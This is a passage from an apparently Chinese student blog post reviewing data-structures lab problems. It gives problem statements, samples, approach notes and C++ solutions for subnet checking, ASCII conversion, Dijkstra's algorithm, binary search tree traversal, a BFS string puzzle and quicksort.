class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; localIP &gt;&gt; sub;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    addr = clca(localIP, sub);</span><br><span class="line">    <span class="built_in">string</span> *ip = <span class="keyword">new</span> <span class="built_in">string</span>[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; ip[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (clca(ip[i], sub) == addr)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"INNER"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"OUTER"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-B-快来秒杀我"><a href="#问题-B-快来秒杀我" class="headerlink" title="问题 B: 快来秒杀我"></a>问题 B: 快来秒杀我</h3><h5 id="题目描述-12"><a href="#题目描述-12" class="headerlink" title="题目描述"></a>题目描述</h5><p>根据前几次竞赛的情况，这次为了给新手们一点信心，特提供这道秒杀题来让大家杀。<br>ASCII码大家应该都学过了，现在给你一个很简单的任务，输入数字，表示ASCII码，输出对应的文本内容。</p>
<h5 id="输入-12"><a href="#输入-12" class="headerlink" title="输入"></a>输入</h5><p>输入的第一行是一个整数T（1&lt;=T&lt;=100）。<br>接下来输入T个正整数，这些数之间用空格、换行或Tab键来分隔。<br>测试数据保证输入的整数都在ASCII码范围内，并且不小于32。</p>
<h5 id="输出-12"><a href="#输出-12" class="headerlink" title="输出"></a>输出</h5><p>在一行中输出对应的文本内容。</p>
<h5 id="样例输入-11"><a href="#样例输入-11" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">13</span></span><br><span class="line"><span class="symbol">72 </span><span class="number">101</span> <span class="number">108</span> <span class="number">108</span> <span class="number">111</span> <span class="number">44</span></span><br><span class="line"><span class="symbol">32 </span><span class="number">119</span> <span class="number">111</span> <span class="number">114</span> <span class="number">108</span> <span class="number">100</span> <span class="number">33</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-12"><a href="#样例输出-12" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Hello,</span> world!</span><br></pre></td></tr></table></figure>
<h5 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h5><p>水题，没啥好说的，强制类型转换一下即可。</p>
<h5 id="代码-12"><a href="#代码-12" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn], t;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; (<span class="keyword">char</span>)a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-C-最短路径1"><a href="#问题-C-最短路径1" class="headerlink" title="问题 C: 最短路径1"></a>问题 C: 最短路径1</h3><h5 id="题目描述-13"><a href="#题目描述-13" class="headerlink" title="题目描述"></a>题目描述</h5><p>有n个城市m条道路（n&lt;1000, m&lt;10000)，每条道路有个长度，请找到从起点s到终点t的最短距离和经过的城市名。</p>
<h5 id="输入-13"><a href="#输入-13" class="headerlink" title="输入"></a>输入</h5><p>输入包含多组测试数据。</p>
<p>每组第一行输入四个数，分别为n，m，s，t。</p>
<p>接下来m行，每行三个数，分别为两个城市名和距离。</p>
<h5 id="输出-13"><a href="#输出-13" class="headerlink" title="输出"></a>输出</h5><p>每组输出占两行。</p>
<p>第一行输出起点到终点的最短距离。</p>
<p>第二行输出最短路径上经过的城市名，如果有多条最短路径，输出字典序最小的那条。若不存在从起点到终点的路径，则输出“can’t arrive”。</p>
<h5 id="样例输入-12"><a href="#样例输入-12" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">3 </span><span class="number">3</span> <span class="number">1</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">3</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">2</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-13"><a href="#样例输出-13" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">2</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h5><p>当时OJ可能有些问题，所有人都超时，所以就没认真写… 现在重新写了一下，测试了几组数据没问题，但没经过OJ的检验。</p>
<p>用的是Dijkstra算法：</p>
<ul>
<li><code>dist</code>数组存每个点距离起始点的距离；</li>
<li><code>book</code>数组存放已经确定最短路径的点；</li>
<li>二维数组<code>e[i][j]</code>存放<code>i</code>到<code>j</code>的距离，距离为<code>inf</code>时表示不可达；</li>
<li><code>pre</code>数组存放最优解中终点的前一个要经过的点（如果不需要输出路径，只要输出最后的路径长度，则不需要这个数组）</li>
</ul>
<p>然后就和书上的思路一样了，不断更新<code>dist</code>、<code>book</code>、<code>pre</code>三个数组，最后用<code>pre</code>数组递归输出路径，例如：若<code>1-&gt;5</code>的最短路径前面一个经过的点为4（即路径为<code>1-&gt;...-&gt;4-&gt;5</code>），那么就去递归查询<code>1-&gt;4</code>的最短路径；若<code>1-&gt;4</code>的最短路径前面一个经过的点为3（即路径为<code>1-&gt;...-&gt;3-&gt;4-&gt;5</code>），那么就递归查询<code>1-&gt;3</code>的最短路径……直到起始点。</p>
<h5 id="代码-13"><a href="#代码-13" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line"><span class="keyword">int</span> n, m, s, t;</span><br><span class="line"><span class="keyword">int</span> inf = <span class="number">0xffffff</span>;</span><br><span class="line"><span class="keyword">int</span> book[maxn], dist[maxn], pre[maxn];</span><br><span class="line"><span class="keyword">int</span> e[maxn][maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TraceBack</span><span class="params">(<span class="keyword">int</span> pre[], <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == s)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; n &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        TraceBack(pre, pre[n]);	<span class="comment">//递归输出点n前一个点的最短路径</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; n &lt;&lt; <span class="string">" "</span>;		<span class="comment">//输出点n</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//n个顶点，m条边</span></span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m &gt;&gt; s &gt;&gt; t;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == j)</span><br><span class="line">            &#123;</span><br><span class="line">                e[i][j] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                e[i][j] = inf;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//读入初始边</span></span><br><span class="line">    <span class="keyword">while</span> (m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> a, b, c;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">        e[a][b] = c; <span class="comment">//a-&gt;b 距离为c</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//初始化dis数组和pre数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dist[i] = e[s][i];</span><br><span class="line">        <span class="keyword">if</span> (dist[i] != inf)</span><br><span class="line">        &#123;</span><br><span class="line">            pre[i] = s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//设起点前面的点为0</span></span><br><span class="line">    pre[s] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//初始化book数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        book[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将起点加入S集合中</span></span><br><span class="line">    book[s] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Dijkstra</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> u, min = inf;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (book[j] == <span class="number">0</span> &amp;&amp; dist[j] &lt; min)</span><br><span class="line">            &#123;</span><br><span class="line">                min = dist[j];</span><br><span class="line">                u = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        book[u] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">1</span>; k &lt;= n; k++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (e[u][k] &lt; inf)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (dist[k] &gt; dist[u] + e[u][k])</span><br><span class="line">                &#123;</span><br><span class="line">                    dist[k] = dist[u] + e[u][k];</span><br><span class="line">                    pre[k] = u;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (dist[t] &lt; inf)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; dist[t] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        TraceBack(pre, t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"can't arrive"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-D-二叉排序树"><a href="#问题-D-二叉排序树" class="headerlink" title="问题 D: 二叉排序树"></a>问题 D: 二叉排序树</h3><h5 id="题目描述-14"><a href="#题目描述-14" class="headerlink" title="题目描述"></a>题目描述</h5><p>输入一系列整数，建立二叉排序数，并进行前序，中序，后序遍历。</p>
<h5 id="输入-14"><a href="#输入-14" class="headerlink" title="输入"></a>输入</h5><p>输入第一行包括一个整数n(1&lt;=n&lt;=100)。接下来的一行包括n个整数。</p>
<h5 id="输出-14"><a href="#输出-14" class="headerlink" title="输出"></a>输出</h5><p>可能有多组测试数据，对于每组数据，将题目所给数据建立一个二叉排序树，并对二叉排序树进行前序、中序和后序遍历。每种遍历结果输出一行。每行最后一个数据之后有一个空格。</p>
<h5 id="样例输入-13"><a href="#样例输入-13" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="symbol">2 </span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="symbol">8 </span><span class="number">15</span> </span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="symbol">21 </span><span class="number">10</span> <span class="number">5</span> <span class="number">39</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-14"><a href="#样例输出-14" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">2 </span></span><br><span class="line"><span class="symbol">2 </span></span><br><span class="line"><span class="symbol">2 </span></span><br><span class="line"><span class="symbol">8 </span><span class="number">15</span> </span><br><span class="line"><span class="symbol">8 </span><span class="number">15</span> </span><br><span class="line"><span class="symbol">15 </span><span class="number">8</span> </span><br><span class="line"><span class="symbol">21 </span><span class="number">10</span> <span class="number">5</span> <span class="number">39</span> </span><br><span class="line"><span class="symbol">5 </span><span class="number">10</span> <span class="number">21</span> <span class="number">39</span> </span><br><span class="line"><span class="symbol">5 </span><span class="number">10</span> <span class="number">39</span> <span class="number">21</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-14"><a href="#思路-14" class="headerlink" title="思路"></a>思路</h5><p>二叉排序树，以递归插入的方式建立二叉树，插入的时候判断与父节点的大小，小的放左儿子，大的放右儿子。</p>
<p>前序、中序、后序遍历就不说了换一下位置就好了。</p>
<h5 id="代码-14"><a href="#代码-14" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    node *lchild;</span><br><span class="line">    node *rchild;</span><br><span class="line">    node(<span class="keyword">int</span> num) : data(num), lchild(<span class="literal">NULL</span>), rchild(<span class="literal">NULL</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> num, node *&amp;T)</span> <span class="comment">//*&amp;是关键</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!T)</span><br><span class="line">    &#123;</span><br><span class="line">        T = <span class="keyword">new</span> node(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (num &lt; T-&gt;data)</span><br><span class="line">    &#123;</span><br><span class="line">        insert(num, T-&gt;lchild);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (num &gt; T-&gt;data)</span><br><span class="line">    &#123;</span><br><span class="line">        insert(num, T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preOrder</span><span class="params">(node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!T)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; T-&gt;data &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    preOrder(T-&gt;lchild);</span><br><span class="line">    preOrder(T-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inOrder</span><span class="params">(node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!T)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    inOrder(T-&gt;lchild);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; T-&gt;data &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    inOrder(T-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postOrder</span><span class="params">(node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!T)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    postOrder(T-&gt;lchild);</span><br><span class="line">    postOrder(T-&gt;rchild);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; T-&gt;data &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    node *root;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> num;</span><br><span class="line">        root = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; num;</span><br><span class="line">            <span class="comment">//以插入的方式建立二叉树</span></span><br><span class="line">            insert(num, root);</span><br><span class="line">        &#125;</span><br><span class="line">        preOrder(root);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        inOrder(root);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        postOrder(root);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-E-密码锁"><a href="#问题-E-密码锁" class="headerlink" title="问题 E: 密码锁"></a>问题 E: 密码锁</h3><h5 id="题目描述-15"><a href="#题目描述-15" class="headerlink" title="题目描述"></a>题目描述</h5><p>玛雅人有一种密码，如果字符串中出现连续的2012四个数字就能解开密码。给一个长度为N的字符串，（2=&lt;N&lt;=13）该字符串中只含有0,1,2三种数字，问这个字符串要移位几次才能解开密码，每次只能移动相邻的两个数字。例如02120经过一次移位，可以得到20120,01220,02210,02102，其中20120符合要求，因此输出为1.如果无论移位多少次都解不开密码，输出-1。</p>
<h5 id="输入-15"><a href="#输入-15" class="headerlink" title="输入"></a>输入</h5><p>第一行输入N，第二行输入N个数字，只包含0，1，2</p>
<h5 id="输出-15"><a href="#输出-15" class="headerlink" title="输出"></a>输出</h5><h5 id="样例输入-14"><a href="#样例输入-14" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">02120</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">02120</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-15"><a href="#样例输出-15" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-15"><a href="#思路-15" class="headerlink" title="思路"></a>思路</h5><p>BFS，具体步骤在注释里写的很清楚了….</p>
<p>STL是真的好用</p>
<h5 id="代码-15"><a href="#代码-15" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt; M;</span><br><span class="line"><span class="built_in">queue</span>&lt;<span class="built_in">string</span>&gt; Q;</span><br><span class="line"><span class="comment">//交换str的第i位和第i+1位</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">Swap</span><span class="params">(<span class="built_in">string</span> str, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> newStr = str;</span><br><span class="line">    <span class="keyword">char</span> tmp = newStr[i];</span><br><span class="line">    newStr[i] = newStr[i + <span class="number">1</span>];</span><br><span class="line">    newStr[i + <span class="number">1</span>] = tmp;</span><br><span class="line">    <span class="keyword">return</span> newStr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断是否满足条件</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Judge</span><span class="params">(<span class="built_in">string</span> str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (str.find(<span class="string">"2012"</span>, <span class="number">0</span>) == <span class="built_in">string</span>::npos)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//BFS</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BFS</span><span class="params">(<span class="built_in">string</span> str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> newStr;</span><br><span class="line">    M.clear();</span><br><span class="line">    <span class="keyword">while</span> (!Q.empty())</span><br><span class="line">        Q.pop();</span><br><span class="line">    <span class="comment">//初始str入列</span></span><br><span class="line">    Q.push(str);</span><br><span class="line">    <span class="comment">//字符串为键，交换次数为值，初始移动次数为0</span></span><br><span class="line">    M[str] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//只要队列中还有组合的字符串</span></span><br><span class="line">    <span class="keyword">while</span> (!Q.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//队首的字符串出列</span></span><br><span class="line">        str = Q.front();</span><br><span class="line">        Q.pop();</span><br><span class="line">        <span class="comment">//遍历该字符串所有交换2位的组合</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= str.length() - <span class="number">1</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            newStr = Swap(str, i);</span><br><span class="line">            <span class="comment">//若交换后的新字符串未出现过</span></span><br><span class="line">            <span class="keyword">if</span> (M.find(newStr) == M.end())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//此新字符串的交换次数等于上一轮循环字符串的交换次数加1</span></span><br><span class="line">                M[newStr] = M[str] + <span class="number">1</span>;</span><br><span class="line">                <span class="comment">//判断该字符是否符合要求，符合则返回交换次数，不符合则将该字符串入列，进行下一轮遍历</span></span><br><span class="line">                <span class="keyword">if</span> (Judge(newStr))</span><br><span class="line">                    <span class="keyword">return</span> M[newStr];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    Q.push(newStr);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果该新字符串已出现过，则直接跳过</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">string</span> str;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; str;</span><br><span class="line">        <span class="keyword">if</span> (Judge(str) == <span class="literal">true</span>)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"0"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> ans = BFS(str);</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-F-算法10-6-10-8：快速排序"><a href="#问题-F-算法10-6-10-8：快速排序" class="headerlink" title="问题 F: 算法10-6~10-8：快速排序"></a>问题 F: 算法10-6~10-8：快速排序</h3><h5 id="题目描述-16"><a href="#题目描述-16" class="headerlink" title="题目描述"></a>题目描述</h5><p>快速排序是对起泡排序的一种改进。它的基本思想是，通过一趟排序将待排序的记录分割成两个独立的部分，其中一部分记录的关键字均比另一部分的关键字小，在分成两个部分之后则可以分别对这两个部分继续进行排序，从而使整个序列有序。<br>快速排序的算法可以描述如下：<br><img src="/2019/10/20/数据结构实验复习/20191019185538126.png" alt="在这里插入图片描述"><br>在本题中，读入一串整数，将其使用以上描述的快速排序的方法从小到大排序，并输出。</p>
<h5 id="输入-16"><a href="#输入-16" class="headerlink" title="输入"></a>输入</h5><p>输入的第一行包含1个正整数n，表示共有n个整数需要参与排序。其中n不超过100000。<br>第二行包含n个用空格隔开的正整数，表示n个需要排序的整数。</p>
<h5 id="输出-16"><a href="#输出-16" class="headerlink" title="输出"></a>输出</h5><p>只有1行，包含n个整数，表示从小到大排序完毕的所有整数。<br>请在每个整数后输出一个空格，并请注意行尾输出换行。</p>
<h5 id="样例输入-15"><a href="#样例输入-15" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">2</span> <span class="number">8</span> <span class="number">4</span> <span class="number">6</span> <span class="number">1</span> <span class="number">10</span> <span class="number">7</span> <span class="number">3</span> <span class="number">5</span> <span class="number">9</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-16"><a href="#样例输出-16" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
<h5 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h5><p>在本题中，需要按照题目描述中的算法完成快速排序的算法。</p>
<p>快速排序是一种十分常用的排序算法，其平均时间复杂度为O(knlnn)，其中n为待排序序列中记录的个数，k为常数。大量的实际应用证明，在所有同数量级的此类排序算法中，快速排序的常数因子k是最小的，因此，就平均时间而言，快速排序是目前被认为最好的一种内部排序方法。</p>
<p>而在C语言的常用编译器中，qsort函数是一个非常常用的快速排序函数。</p>
